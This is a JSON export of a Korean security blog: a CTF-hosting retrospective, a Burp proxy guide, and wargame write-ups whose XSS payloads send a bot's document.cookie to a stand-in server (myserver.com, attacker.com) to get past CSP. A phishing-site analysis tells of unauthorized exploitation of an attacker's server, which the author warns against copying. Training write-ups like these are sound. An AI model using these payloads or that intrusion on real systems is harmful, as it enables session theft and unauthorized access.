{"meta":{"title":"JHYEON","subtitle":"Security Researcher","description":"JHYEON BLOG","author":"DongHyeon Jeong","url":"https://blog.jhyeon.dev","root":"/"},"pages":[{"title":"All Category","date":"2021-08-14T05:20:52.705Z","updated":"2021-08-14T05:20:52.705Z","comments":true,"path":"categories/index.html","permalink":"https://blog.jhyeon.dev/categories/index.html","excerpt":"","text":""},{"title":"All Tags","date":"2021-08-14T05:20:49.811Z","updated":"2021-08-14T05:20:49.811Z","comments":true,"path":"tags/index.html","permalink":"https://blog.jhyeon.dev/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Hackingcamp 23th Web Write up","slug":"hcamp23-writeup-210822","date":"2021-08-22T04:21:11.000Z","updated":"2021-08-22T04:25:56.539Z","comments":true,"path":"2021/08/22/hcamp23-writeup-210822/","link":"","permalink":"https://blog.jhyeon.dev/2021/08/22/hcamp23-writeup-210822/","excerpt":"","text":"해당 자료는 아래 노션 열람 또는 구글 드라이브(PDF)를 통해 다운로드 가능합니다. Google Drive Open to Notion","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/tags/CTF/"},{"name":"해킹캠프","slug":"해킹캠프","permalink":"https://blog.jhyeon.dev/tags/%ED%95%B4%ED%82%B9%EC%BA%A0%ED%94%84/"},{"name":"보안","slug":"보안","permalink":"https://blog.jhyeon.dev/tags/%EB%B3%B4%EC%95%88/"},{"name":"해킹","slug":"해킹","permalink":"https://blog.jhyeon.dev/tags/%ED%95%B4%ED%82%B9/"},{"name":"버그바운티","slug":"버그바운티","permalink":"https://blog.jhyeon.dev/tags/%EB%B2%84%EA%B7%B8%EB%B0%94%EC%9A%B4%ED%8B%B0/"},{"name":"HackingCamp","slug":"HackingCamp","permalink":"https://blog.jhyeon.dev/tags/HackingCamp/"},{"name":"POC Security","slug":"POC-Security","permalink":"https://blog.jhyeon.dev/tags/POC-Security/"},{"name":"DEMON","slug":"DEMON","permalink":"https://blog.jhyeon.dev/tags/DEMON/"},{"name":"SISS","slug":"SISS","permalink":"https://blog.jhyeon.dev/tags/SISS/"}]},{"title":"23회 해킹캠프 CTF 운영 후기","slug":"hcamp23-210816","date":"2021-08-15T23:00:00.000Z","updated":"2021-08-16T05:17:23.137Z","comments":true,"path":"2021/08/16/hcamp23-210816/","link":"","permalink":"https://blog.jhyeon.dev/2021/08/16/hcamp23-210816/","excerpt":"","text":"Summary작년 해킹캠프 22회에 이어서 올해도 23회 해킹캠프 CTF 운영을 맡았다. (데몬팀이라서 ㅎㅎ) 이번에는 오프라인을 조금 기대하고 있었는데 6-7월부터 급격하게 코로나19 확진자가 늘어나서 오프라인은 불가능하였고, 23회도 온라인으로 진행되었지만 그래도 참가자분들께서 다 재밌게 참여해주셨고 행사를 함께 준비해주신 피오씨시큐리티, 데몬팀, SISS, 발표자분들 다들 고생많이하셨습니다! CTF우선 운영을 맡았던 CTF의 경우에는 올해 12시간(20:00~08:00)으로 진행되었다. 문제의 경우에는 작년 대비 난이도를 조금 향상하였었는데 비하인드 스토리가 있어서 문제 관련은 잠시… 작년이랑 다르게 이번엔 팀전으로 진행되었고 총 47명의 참가자분들이 참여를 해주셔서 A~E 팀으로 각각 나누게 되었다. 잘하시는분도 많이 계셨고 팀 밸런스가 전체적으로 잘 맞게 진행된 것 같아서 다행이고, 팀전 아이디어를 내주신 같은팀 팀원분에게 👏 초반에 1,2,3 순위를 탈환하기 위해 되게 치열했었고 신기한건 참가자분들이 12시간 CTF에도 불구하고 아침까지 거의 20명 후반에 가깝게 접속을 하고 계셨다.. (체력이 대단하십니다..) 다들 너무 열정적이고 동기부여를 해주시는 듯 했다. (사실 전 새벽 5시 조금 넘어서 기절하듯이 1시간 잤다가 알림 쌓인거보고 화들짝깨서 다시 대회 관리를 했다는..) CTF 대회가 마무리되어가던 시점에는 1,2,3등이 거의 정해졌는데 출제된 카테고리(web, pwn, rev crypto, misc)의 문제들을 골고루 푸셨던 것 같다 👍👍 문제 출제이번에 나는 웹 카테고리에서 총 4개의 문제 출제를 담당하였다. 왠만하면 작년보다 난이도를 상향하기 위해 트릭보다는 취약점을 분석해야하고 이를 익스플로잇해서 플래그를 얻는 방식를 택했다. 그러나 문제 개발, 검증 과정에서 꽤 많은 이슈가 있었고 이것을 사전에 꼼꼼한 검증을 안했던 탓에 대회 중간중간에 문제가 수정되어야 하는 일이 발생했다. (로컬서버, 실서버)에서 익스 테스트는 진행했으나 일부 로직에 이슈가 있었고 이슈에 대한 내용의 코드가 수정되는 과정에서 코드를 커밋해놓고 그냥 그대로 pull만 받아서 업데이트를 했는데, 실서버에서 문제가 정상적으로 풀리는지에 대한 검증을 하지 않았다 ㅠ_ㅠ (너무 당연하게 내 코드를 믿고 작성했던 것이 문제였고 로직이 어떻게 돌아가는지 정확히 체크를 안해보고 커밋을 해버린 것이다..) 변경된 코드는 다음과 같다. (기존 &gt; 1차수정(이슈) &gt; 2차 수정) 이제와서 보는거지만 1차 변경때 코드를 왜 저렇게 짰을까 하면서 본인도 의아하게 느껴졌다. 정말 코드를 이상하게 짰다. 분명 저렇게하면 업로드 디렉토리가 계속 변경되면서 정상적인 풀이가 불가능함에도 아무생각없이 코드를 짠 것 같다.. (맞아야함 ㅠㅠ) (기존) $ip = $_SERVER[&#39;REMOTE_ADDR&#39;]; (변경) $path = hash(&#39;sha256&#39;, rand(1,99999)); (2차 변경) $pass = $_POST[&#39;upload_pass&#39;]; if(!preg_match(&quot;/[0-9A-za-z]/i&quot;, $pass))&#123; die(&quot;~~~&quot;); &#125; $encrypt_path = hash(&#39;sha256&#39;, $pass); 때문에, 한 문제에 대한 풀이 이슈를 거의 대회가 끝나기 2시간전쯤 알았고 문제가 정상적으로 풀리는지 보고 계셨던 “익명의 해커” 분께서 이를 지적해주셨고 더군다나 언인텐 풀이까지 지적을 해주셔서 그 이슈를 확인했을 당시에는 눈앞이 잠시 캄캄했다. (핑계라면 핑계지만.. 최근에 일이 바빠서 문제 개발 및 테스트 일정 마감을 정해진 기한안에 하지 못했고, 일정에 맞추다보니 문제 테스트 과정을 진행했음에도 이를 꼼꼼히 못했다는것은 내 책임이라 참가자분들에게 이 부분은 정말 죄송하게 생각하고 있다) 제가 잘못 운영했던 사실이 분명하고 향후 같은 일이 발생하지 않도록 더 꼼꼼히 검수하겠다고 본인 스스로 뼈저리게 느꼈던 케이스이다. (참가자분들 정말 죄송합니다 ㅠ_ㅠ) 마무리이번에는 대회 운영하면서 저의 미숙하고 부족한 부분이 많았고 향후 같은 케이스가 발생되는일은 절대 없을 것이라고 다짐하겠습니다. 그래도 다들 열정적으로 해킹캠프에 참가해주시고 마지막까지 잘 마무리해주셔서 감사드립니다. 24회 해킹캠프때는 오프라인에서 뵙길 기대하며 글을 마무리합니다.","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/tags/CTF/"},{"name":"해킹캠프","slug":"해킹캠프","permalink":"https://blog.jhyeon.dev/tags/%ED%95%B4%ED%82%B9%EC%BA%A0%ED%94%84/"},{"name":"보안","slug":"보안","permalink":"https://blog.jhyeon.dev/tags/%EB%B3%B4%EC%95%88/"},{"name":"해킹","slug":"해킹","permalink":"https://blog.jhyeon.dev/tags/%ED%95%B4%ED%82%B9/"},{"name":"버그바운티","slug":"버그바운티","permalink":"https://blog.jhyeon.dev/tags/%EB%B2%84%EA%B7%B8%EB%B0%94%EC%9A%B4%ED%8B%B0/"},{"name":"HackingCamp","slug":"HackingCamp","permalink":"https://blog.jhyeon.dev/tags/HackingCamp/"},{"name":"POC Security","slug":"POC-Security","permalink":"https://blog.jhyeon.dev/tags/POC-Security/"},{"name":"DEMON","slug":"DEMON","permalink":"https://blog.jhyeon.dev/tags/DEMON/"},{"name":"SISS","slug":"SISS","permalink":"https://blog.jhyeon.dev/tags/SISS/"}]},{"title":"IOS 단말기에서 Burp Suite 프록시 사용 방법","slug":"iosproxy-210814","date":"2021-08-14T10:20:00.000Z","updated":"2021-08-14T13:20:42.464Z","comments":true,"path":"2021/08/14/iosproxy-210814/","link":"","permalink":"https://blog.jhyeon.dev/2021/08/14/iosproxy-210814/","excerpt":"","text":"Summary이번 게시글에서는 IOS 운영체제에서 Burp Suite 프록시를 구성하는 방법을 소개하고자 합니다. 크게 어려운 사항은 없으나 https 패킷을 Intercept 하기 위해서는 Burp 인증서를 함께 설치해야합니다. 네트워크 설정(IOS)우선 아이폰에 연결된 WIFI 탭에 들어가서 연결된 와이파이의 정보 탭에 들어가면 하단에 HTTP 프록시 에 보면 프록시 구성이 있을 것입니다. 해당 구성탭에 들어가서, 프록시 구성 모드를 수동 으로 설정한 뒤 서버란에는 Burp Suite를 사용할 PC(호스트)의 IP주소, 포트는 Burp Suite에서 본인이 설정한 포트를 입력해주면 됩니다. 네트워크 설정(PC, Burp Suite)Burp Suite 에서의 네트워크 설정은 아래 사진과 같이 설정하면 됩니다. Proxy &gt; Options &gt; Proxy Listeners 탭에서 Add를 눌러 Bind to port란에 디바이스와 통신할 포트(ex, 8081)을 적고 Bind to Address는 All interface 옵션으로 바꿔준 뒤 저장하면 됩니다. 인증서 설치(IOS)아이폰 기기로 Safari 브라우저에 접속하신 뒤 아래 주소에 접속해주세요! http://burp 이후 오른쪽 상단에 있는 CA Certificate 메뉴를 누르신 뒤 인증서를 다운로드 받으신 후, 아이폰 설정 &gt; 일반 &gt; 프로파일 탭에 가시면 다운로드 받으신 인증서가 있습니다. 해당 인증서를 클릭하여 설치하시면 됩니다.","categories":[{"name":"Mobile","slug":"Mobile","permalink":"https://blog.jhyeon.dev/categories/Mobile/"}],"tags":[{"name":"IOS","slug":"IOS","permalink":"https://blog.jhyeon.dev/tags/IOS/"},{"name":"모의해킹","slug":"모의해킹","permalink":"https://blog.jhyeon.dev/tags/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/"},{"name":"프록시","slug":"프록시","permalink":"https://blog.jhyeon.dev/tags/%ED%94%84%EB%A1%9D%EC%8B%9C/"},{"name":"Burp Suite","slug":"Burp-Suite","permalink":"https://blog.jhyeon.dev/tags/Burp-Suite/"}]},{"title":"KOSPO 한국남부발전 2회차 정보보안 경진대회 후기","slug":"kospo-210814","date":"2021-08-13T15:00:00.000Z","updated":"2021-08-14T05:53:26.916Z","comments":true,"path":"2021/08/14/kospo-210814/","link":"","permalink":"https://blog.jhyeon.dev/2021/08/14/kospo-210814/","excerpt":"","text":"Summary 한국남부발전 제 2회 KOSPO 정보보안 경진대회https://www.kospo.co.kr/bbs/kospo/95/102365/artclView.do 이번에 KOSPO 한국남부발전 웹서비스 정보보안 경진대회에 참가해보았습니다 ㅎㅎ.. 팀원들은 BOB에서 같이 활동했던 친구들과 3인팀으로 출전하게 되었는데 대회 때 컨디션이 좋지 못한 관계로 전력을 다 못해서 많이 아쉬움도 남는 대회였습니다. 최종 순위는 어떻게 될진 모르겠지만 7시 기준으로 중간 집계했을 땐 10위 라는 순위를 기록할 수 있었고 그래도 최근에 하루동안 풀타임으로 집중해서 했던 대회이기도 하네요 ㅎㅎ 이번 대회 계기로 부족했던 점도 느끼게 되었고 다음 대회(내년이겠죠..ㅎㅎ) 때는 순위권에 들어가는 것을 목표로 하여 필요한 공부들을 더 많이 해야겠다고 생각하였습니다! 대회가 끝나고 알게 되었던 정보지만.. 임의로 취약하게 만들어둔 페이지들이 많았고 심지어 커맨드 인젝션을 통해 RCE가 가능했던 페이지를 만들어둔것이 있어서.. 너무 리얼월드 관점에서만 생각했던 것이 이번 대회에서 좋은 성과를 못낸 것 같기도합니다 ㅠ_ㅠ","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/tags/CTF/"},{"name":"버그바운티","slug":"버그바운티","permalink":"https://blog.jhyeon.dev/tags/%EB%B2%84%EA%B7%B8%EB%B0%94%EC%9A%B4%ED%8B%B0/"},{"name":"모의해킹","slug":"모의해킹","permalink":"https://blog.jhyeon.dev/tags/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/"},{"name":"KOSPO","slug":"KOSPO","permalink":"https://blog.jhyeon.dev/tags/KOSPO/"},{"name":"한국남부발전","slug":"한국남부발전","permalink":"https://blog.jhyeon.dev/tags/%ED%95%9C%EA%B5%AD%EB%82%A8%EB%B6%80%EB%B0%9C%EC%A0%84/"}]},{"title":"Memory Mitigation - Canary","slug":"memory-mitigation-4","date":"2021-07-11T01:07:00.000Z","updated":"2021-07-11T01:09:07.886Z","comments":true,"path":"2021/07/11/memory-mitigation-4/","link":"","permalink":"https://blog.jhyeon.dev/2021/07/11/memory-mitigation-4/","excerpt":"","text":"Link해당 포스트는 Notion 문서에 작성되어 있으며, 아래 링크 접속 시 자료를 확인할 수 있답니다~ https://www.notion.so/jhyeon/Linux-Memory-Mitigation-Canary-5239b7144d0a41ff8e71bf3e55c3230f","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"메모리 보호기법","slug":"메모리-보호기법","permalink":"https://blog.jhyeon.dev/tags/%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95/"},{"name":"Memory Mitigation","slug":"Memory-Mitigation","permalink":"https://blog.jhyeon.dev/tags/Memory-Mitigation/"},{"name":"Canary","slug":"Canary","permalink":"https://blog.jhyeon.dev/tags/Canary/"}]},{"title":"WebHacking.kr CHILD Write up","slug":"webhackingkr-child-0711","date":"2021-07-11T00:40:00.000Z","updated":"2021-07-11T01:05:42.565Z","comments":true,"path":"2021/07/11/webhackingkr-child-0711/","link":"","permalink":"https://blog.jhyeon.dev/2021/07/11/webhackingkr-child-0711/","excerpt":"","text":"인사말이번엔 웹케알 새 문제 CHILD 문제에 대한 풀이에요~ 참고하시어 많은 도움이 되었으면 좋겠습니다 ㅎㅎ. 분석 어라. 페이지가 이전 BABY 문제랑 흡사하네요? 이번에도 CSP 문제일까요~ 네 맞습니다. CSP 보안 정책이 적용되어있죠? 그런데 이전 문제랑은 조금 다른 정책이 있습니다. script-src 리소스에 대해서 https://*.google.com 에서 오는 도메인은 허용하겠다라는 의미인데요. 그럼 google 도메인을 가지면서 callback으로 응답을 주는 사이트를 활용하면 되는것인데요 간단하게 jsonp callback endpoint 이라는 내용으로 검색을 해보시면 금방 알아채실거에요~ 예시 사이트들을 알려드리자면 아래 사이트에 google을 포함한 다른 여러 사이트들의 jsonp callback을 알려주는 문서에요. https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt 허용된 *.google.com 도메인의 jsonp callback을 활용해 XSS를 발생시키고 이전 문제처럼 봇의 쿠키를 탈취하는 문제인데요~~ 저는 https://accounts.google.com/o/oauth2~~ 라는 주소를 사용할 거에요. 그럼 이번엔 페이로드를 어떻게 만들까? BABY 문제처럼 script src 리소스를 불러오는게 없기 때문에 inject 파라미터에 다이렉트로 페이로드를 인젝션해줘야 하는데 script src 리소스를 불러오도록 만들면 되죠? `&amp;ltscript+src&amp;gt=&quot;https://accounts.google.com/o/oauth2/revoke?callback=location.href=&#39;https://myserver.com/?flag=&#39;+document.cookie;&quot;&amp;gt&amp;lt/script&amp;gt &amp;lt &amp;gt는 각각 &lt; &gt; 을 의미하며 이는.. 블로그 내 게시글 단순 필터링 목적으로 적용하니 참고하여 봐주세요! 무튼 inject 파라미터에 위 페이로드를 인젝션하게 되면 myserver.com 으로 redirection 이 되는것을 알 수 있어요~ 이 점을 활용해서 report 페이지에 해당 페이로드를 send해서 봇이 사이트에 방문해주도록 만들면? 플래그 획 ~ 득 ~ 완 ~ 료 !@!","categories":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"}],"tags":[{"name":"WebHacking.kr","slug":"WebHacking-kr","permalink":"https://blog.jhyeon.dev/tags/WebHacking-kr/"},{"name":"WebHacking","slug":"WebHacking","permalink":"https://blog.jhyeon.dev/tags/WebHacking/"},{"name":"Write up","slug":"Write-up","permalink":"https://blog.jhyeon.dev/tags/Write-up/"},{"name":"CSP","slug":"CSP","permalink":"https://blog.jhyeon.dev/tags/CSP/"}]},{"title":"WebHacking.kr Baby Write up","slug":"webhackingkr-baby-0710","date":"2021-07-10T23:24:00.000Z","updated":"2021-07-11T00:37:14.788Z","comments":true,"path":"2021/07/11/webhackingkr-baby-0710/","link":"","permalink":"https://blog.jhyeon.dev/2021/07/11/webhackingkr-baby-0710/","excerpt":"","text":"인사말안녕하세요! 이전에 글을 쓴지 1일쯤 되었나요.. 밤에 잠이 안와서 문제를 풀고 롸업을 가져왔습니다 ㅎㅎ 아직 풀이 ing 중인 문제들이 있지만 일부 문제들을 먼저 풀이를 공개하고자 합니다. 풀이는 참고만 하시되 복붙(ctrl+cv) 하시는 일은 없으셔야 공부가 된답니다~! 분석&lt;h2&gt;you can inject anything&lt;/h2&gt; &lt;div id=injected&gt; foo &lt;/div&gt; &lt;script src=/script.js nonce=MNku599weiFY9SgO43rDJCqmsX0=&gt;&lt;/script&gt; 우선 BABY 문제 페이지에 들어가보면 페이지 소스코드를 이렇게 볼 수 있습니다. 별 다른건 없고 아래에 script 리소스를 가져오는걸 보면 /script.js nonce=~~~ 로 가져오고 있죠? 이 부분을 활용해서 문제를 풀이할 수 있습니다! 우선.. 현재 페이지에 CSP(Content Security Policy)가 적용되어 있을겁니다. 따라오시죠 이렇게 script-src에 대한 CSP 정책을 nonce 값으로 세팅을 해놨는데 허점이 보이시지 않나요? 바로 URL 뒤에 따라오는 inject= 파라미터입니다. 그럼 이 파라미터에 입력되는 값은 어떻게 처리될까? 현재 페이지에 보면 ?inject=foo 라고 되어있는데 해당 파라미터 값으로 오는 내용을 브라우저 화면에 출력시켜주고 있습니다. 사용자가 입력한 값을 그대로 브라우저에 노출시킨다? XSS 공격에 취약할 수 있죠! 테스트용 페이로드를 삽입해보면 실제 img 태그가 작동하는 것을 알 수 있어요~ 그럼 여기에 어떤 방법의 인젝션을 해야하느냐? 바로 base 태그라는 것을 이용하면 됩니다. base 태그란?? 해당 문서(페이지)의 모든 상대주소에 대한 기본 URL을 정의하는 것을 의미하는데요. 예를 들면 현재 페이지에 &amp;ltscript src=/script.js&amp;gt 이런식으로 script 리소스를 불러오죠? 정상적이라면 http://test.com/script.js 를 의미하고 있겠지만 base 태그를 사용하여 base URL값을 만들어주면? http://attacker.com/script.js 이런식으로 리소스를 얻어오는 경로를 조작할 수 있습니다. 즉 attacker.com 도메인에 있는 script.js를 불러오게 되는것이죠~ 그러면 이제 풀이할 방향이 감이 오시나요~? 풀이우선 본인의 서버에다 script.js 파일을 하나 만들고, 그 안에 내용에 alert(1234) 이런식으로 작성해줍니다. 그리고 다시 문제 페이지로 돌아와서 inject 파라미터에 inject=&amp;ltbase href=&quot;http://attacker.com&quot;&amp;gt 로 만들어줍니다. 그럼 attacker 서버의 script.js 파일을 읽어오면서 alert 박스가 브라우저에 뜰겁니다. 이를 활용해 문제 풀이의 목적인 문제 봇 쿠키 탈취 를 해보겠습니다. 해당 문제는 Chrome Headless를 사용해 일종의 봇이라고 부르는 녀석이 플래그에 대한 값을 가지고 있고, 봇이 가지고 있는 플래그 값을 얻어내기만 하면 문제는 풀이됩니다. 어떻게 풀까요? 바로 cookie 값을 얻는겁니다! 대개 이런 봇들은 header 값에 플래그를 가지고 있는 경우도 있지만 cookie 값에 플래그를 세팅해두고 있는 경우도 있는것이죠. 브라우저에서 쿠키값을 얻으려면 아래 페이로드가 필요합니다. document.cookie 이 내용을 chrome console에 입력시켜보세요. 본인의 쿠키 정보가 출력될겁니다. 그럼 이러한 내용을 조합해서 대략 아래 시나리오로 공격을 시도해보겠습니다. 제보 페이지 -&gt; 페이로드 제출 -&gt; 봇이 서버에 방문 -&gt; 플래그 획득!! 제보 페이지는 report.php에 있답니다. script.js 파일 안에 아래와 같은 페이로드를 만들어준 뒤 봇이 서버에 방문해서 스크립트 리소스를 불러오게 되면 redirection 시켜서 쿠키값을 탈취하는 방식이에요! `location.href=”http://myserver.com/?flag=&quot;+document.cookie; 이렇게 해주면 입력하신 서버로 ?flag 파라미터를 통해 봇이 가지고 있는 쿠키가 작성되서 오겠죠? 문제가 풀이됩니다~~!","categories":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"}],"tags":[{"name":"WebHacking.kr","slug":"WebHacking-kr","permalink":"https://blog.jhyeon.dev/tags/WebHacking-kr/"},{"name":"WebHacking","slug":"WebHacking","permalink":"https://blog.jhyeon.dev/tags/WebHacking/"},{"name":"Write up","slug":"Write-up","permalink":"https://blog.jhyeon.dev/tags/Write-up/"}]},{"title":"Memory Mitigation - NXBIT, DEP","slug":"memory-mitigation-3","date":"2021-07-10T13:13:00.000Z","updated":"2021-07-10T13:14:38.753Z","comments":true,"path":"2021/07/10/memory-mitigation-3/","link":"","permalink":"https://blog.jhyeon.dev/2021/07/10/memory-mitigation-3/","excerpt":"","text":"Link아래 링크에 접속하시면 게시글을 보실 수 있습니다! 바로가기(Notion)","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"메모리 보호기법","slug":"메모리-보호기법","permalink":"https://blog.jhyeon.dev/tags/%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95/"},{"name":"Memory Mitigation","slug":"Memory-Mitigation","permalink":"https://blog.jhyeon.dev/tags/Memory-Mitigation/"},{"name":"NXBIT","slug":"NXBIT","permalink":"https://blog.jhyeon.dev/tags/NXBIT/"},{"name":"DEP","slug":"DEP","permalink":"https://blog.jhyeon.dev/tags/DEP/"}]},{"title":"가상화폐 거래소 피싱 사이트 분석에 대해서","slug":"coinone-phising-0710","date":"2021-07-10T12:04:00.000Z","updated":"2021-07-10T13:11:18.234Z","comments":true,"path":"2021/07/10/coinone-phising-0710/","link":"","permalink":"https://blog.jhyeon.dev/2021/07/10/coinone-phising-0710/","excerpt":"","text":"들어가며우선. 최근이라고 하면 이상한가(?) 아무튼 올해 초부터 가상화폐에 대한 2030 세대들에서 관심을 많이 갖기 시작하면서 국내 3대 거래소라고 불리는 코OO, 빗O, 업OO 등등 유명한 거래소들이 있었죠. 관심을 많이 가지게 된 계기라고하면 다들 아시다시피 도지코인 가격이 거의 10배가까이 폭등하면서 뉴스에 보도되기도 하고.. 뭐 이러면서 사람들이 자연스레 주식 -&gt; 코인으로 유입되기 시작한 시기였죠 ㅎㅎ 그만큼 해커 입장에서는 거래소에 어마어마한 거래 자금이 생기니깐 타겟팅을 거래소쪽을 선택을 하겠죠? 물론 거래소들은 망 분리 등 허술하지 않게 여러 보안 시스템을 잘 구축해놓은지라 거래소를 직접적인 해킹 하는건 불가능에 가깝습니다. 그럼 해커들은 어디를 노릴까요? 바로 피싱 사이트 입니다. 피싱 사이트라고 하면은 실제 사이트와 화면을 똑같이 copy해서 만든 사이트입니다. (아래 예시를 보시죠) 또 이번에 분석할 대상 피싱 사이트는 심지어 국내 번호를 대상으로 무작위로 문자를 전송하여 실제 거래소에 해킹이 발생한 것처럼 꾸며 사이트 접속을 유도하는 식으로 해킹 피해를 발생시켜 왔습니다. 아래 예시 사진과 같습니다. 이런식으로 문자가 오고 사이트는 당연히 피싱 사이트입니다. 이제 바로 본론으로 가겠습니다. 분석 1회차저는 비교적 일찍(?) 피싱 사이트에 대한 존재를 알고 사이트들을 분석하였는데요. 대부분 코OO 거래소의 피싱 사이트였습니다. 왜 다른 거래소들은 없었냐라고 궁금하신 분들이 있으실텐데 없는 것은 아니였습니다. 다만 빈도수가 극히 드물고 해커 입장에서는 까다로웠겠죠 그 이유를 알아봅시다. 당시 코OO 거래소에 로그인을 하기 위한 과정은 생각보다 간단했습니다. 계정 입력 -&gt; (선택) OTP 입력 -&gt; 거래소 로그인 과정으로 진행됩니다. 이 때 OTP(One-Time Password) 방식의 2단계 보안 인증 과정이 있었으나 필수 항목은 아니였습니다. 즉 사용자가 설정함에 따라 OTP를 사용할 수도 있고, 아닐수도 있는건데요. 여기서 해커가 쉽게 타인의 계정을 탈취할 수 있었던 이유는 OTP 미사용 유저를 대상으로 한 타겟팅이였습니다. OTP를 사용하지 않게 되면 이메일, 비밀번호 만 알아도 거래소에 접근이 가능했기 때문이죠. 하지만 다른 거래소들의 예시를 보면 업OO 에서는 카카오톡 연동 로그인 빗O 에서는 보안 비밀번호 + OTP 방식으로 로그인을 할 수 있도록 이중 보안 잠금 기능이 존재하였는데요. 이 때문에 해커 입장에서는 비교적 계정 접속이 쉬운 코OO 거래소를 위주로 피싱 사이트를 만들어내기 시작하였습니다. 분석 2회차실제 피싱 사이트의 예시 화면을 보실까요? 위 자료화면은 코OO 거래소 공식사이트에서 가져온 사진입니다. (분석 당시에 했던 사진들을 삭제한 탓에 ㅠ_ㅠ) 일단 사진을 보면 공식 사이트의 도메인주소랑 다르죠? 공식 사이트는 coinone.co.kr 입니다. 주소들도 생각보다 다양합니다. coinen** coincn** 등등 공식 사이트 도메인에서 철자만 교묘하게 바꾸면서 사이트를 옮겨다닙니다. 그리고 언뜻보면 똑같아 보이지만 사이트에 들어가보면 로그인 말고는 다른 기능들이 동작하지 않습니다. 즉, 로그인 페이지만 copy해서 만들고 나머지 기능들은 구현이 안되어있습니다. 이런 피싱 사이트에 계정을 입력하게 되면 당연히! 코인원 서버가 아닌 해커의 서버로 입력한 정보들이 저장되는 방식인거죠. 위 사진은 제가 COINDB 라는 사이트에서 백엔드를 담당하여 개발을 진행하면서 수집하였던 피싱 사이트의 일부 정보인데요. 보시면은 도메인이 제 각각 모두 다른 구조를 띄고 있습니다. 또한 실제 서버가 운영되고 있는 서버IP 주소를 보면 103, 45 로 시작하는데 정확한 위치를 트래킹할 수는 없었지만 대부분 중국에서 운영되고 있었습니다. VPN로 경로를 우회한건진 정확하게 알 수 없었으나 이후에 나올 맛보기(?)에서 중국임을 확신할 수 있었습니다. 분석 3회차제가 해당 사이트를 분석했을 당시에는 아래와 같은 방식으로 데이터를 저장하고 있었습니다. 예시 사진들을 첨부하면서 설명드리고 싶으나 당시 관련 사진들은 모두 삭제했기에 기억을 짚어서 글을 쓰겠습니다 ㅎㅎ.. 우선 사용자가 계정을 입력하고 로그인 버튼을 누르면 data.php로 입력한 데이터들을 ajax를 사용하여 가공을 해서 데이터를 넘겨주게 됩니다. 이후 data.php 라는 파일에서는 넘어온 데이터들을 DB로 저장시키는 방법을 쓰고 있었겠죠? 이 때 생각난것이 관리자 페이지가 존재하지 않을까? 라고 생각했고 directory fuzzing을 통해서 관리자 페이지의 URL을 획득했습니다. 주소는 매우 간단했습니다 guessing으로도 찾을 수 있었고 /admin/index.php 이라는 path에 관리자 페이지가 존재하고 있었습니다. 이런 피싱 사이트들은 보안에 매우 취약하고 사이트를 구축하는데 돈 한푼 들이지 않습니다. 그말인 즉슨 취약점이 매우 많다는 의미로도 해석되겠지요. 여기서 잠깐 맛보기로 말씀드리면 당시 DB 엔진으로 어떤걸 쓸까 하면서 생각하던 찰나에 비교적 접근성, 구축이 쉬운 MySQL 데이터베이스를 쓸 것이라고 생각했습니다. 그 예상은 적중을 했구요. 그래서 저는 여기서 한 단계 더 접근해서 사이트의 보안 취약점을 이용해 권한 상승, Exploitation에 성공하면서 내부 서버로 침투가 가능했습니다. 즉 DB 데이터도 모두 열람이 가능하였단 의미입니다. 사실 이 방법은 인가되지 않은 접근이기 때문에 이 글을 보시고 함부로 아무 사이트에서 공격을 테스팅하시거나 그러시면 철컹철컹 당합니다. 절대 호기심에 따라하지 마세요~! 아래 사진은 해당 피싱 사이트의 DB 데이터 중 일부 정보가 포함된 예시 사진입니다. 정리현재에도 피싱 사이트들이 많이 존재하고 있습니다. 물론 이렇게 알려져도 피싱 사이트인줄 인지하지 못하시고 거기서 로그인을 하시는 경우가 많은데요. 본인의 소중한 자산을 지키기 위해서는 보안 필수입니다. 항상 경각심을 가지시길 바란다는 마음에서 예전 경험을 좀 작성해봤네요. 요즘에는 거래소에서도 자체적으로 카카오톡 로그인 알림 등을 적용하여 인가되지 않은 사용자의 접근이 발생할 경우 즉시 접속, 거래 차단이 가능한 방법을 적용하고 있어 빈도수가 많이 줄어든 편이라고 생각을 하나 그래도 여전히 많이 발생하고 있습니다. 앞으로도 보안 관련 피해가 발생하지 않길 바라고 피싱은 좀 근절되었으면 좋겠네요. 당연하겠지만 관련 데이터들은 코OO 거래소를 통해 정보들을 모두 넘겨드린 상태입니다 _ 우리 모두 보안에 경각심을 가지고 해킹으로 부터 안전한 환경을 만들어요! 그럼 Goodbye~","categories":[],"tags":[]},{"title":"Webhacking.kr 새로운 문제들이 공개되었네요!","slug":"webhackingkr-renew-0710","date":"2021-07-10T11:55:00.000Z","updated":"2021-07-10T12:01:46.230Z","comments":true,"path":"2021/07/10/webhackingkr-renew-0710/","link":"","permalink":"https://blog.jhyeon.dev/2021/07/10/webhackingkr-renew-0710/","excerpt":"","text":"Webhacking.kr - 웹 해킹 관련 문제 풀이 워게임 사이트라고 많이 알려져들 있죠 예전에는 oldzomebie 님이 운영을 하신걸로 알고있고 최근에는 rubiya님이 운영을 하고 있다고 합니다! 그러면서 새롭게 추가된 문제들도 많이 보이는데요..? (아래 사진과 같이) 문제들을 잠깐잠깐 보고 지나갔었는데 트렌드가 계속 변화하는 만큼 해킹 기술도 발전하니.. 이에 맞춰서 rubiya님이 재미있는 문제들로 많이 구성을 해두신 것 같습니다 